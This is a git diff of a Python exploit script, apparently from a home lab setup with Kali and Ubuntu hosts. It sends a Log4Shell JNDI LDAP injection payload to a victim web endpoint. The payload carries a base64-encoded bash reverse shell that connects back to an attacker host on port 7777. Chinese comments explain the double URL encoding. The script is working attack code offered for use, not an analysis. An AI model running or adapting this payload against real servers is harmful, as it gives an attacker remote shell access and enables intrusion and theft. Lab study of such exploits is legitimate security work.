@@ -5,7 +5,8 @@ import urllib.parse
 
 import requests
 
-ATTACKER_HOSTNAME = "kali-attacker.mlab"
+# ATTACKER_HOSTNAME = "kali-attacker.mlab"
+ATTACKER_HOSTNAME = "192.168.56.162"
 VICTIM_HOSTNAME = "ubuntu-victim.mlab"
 
 shell_redirection = f"bash -i >& /dev/tcp/{ATTACKER_HOSTNAME}/7777 0>&1"
@@ -20,14 +21,15 @@ params = {
     # "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjU2LjIxNC83Nzc3IDA+JjE=}",
     # "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xOTIuMTY4LjU2LjE2Mi83Nzc3IDA%2BJjE%3d}",
     "payload": "${jndi:ldap://kali-attacker.mlab:1389/TomcatBypass/Command/Base64/"
-    + urllib.parse.quote_plus(shell_redirection_b64)
+    + urllib.parse.quote_plus(shell_redirection_b64)  # 第一次 url 编码
+    # + shell_redirection_b64
     + "}",
 }
 
 
 response = requests.get(
     "http://ubuntu-victim.mlab:8080/hello",
-    params=params,
+    params=params,  # requests 自动会进行第二次 url 编码
     verify=False,
     timeout=10,
 )
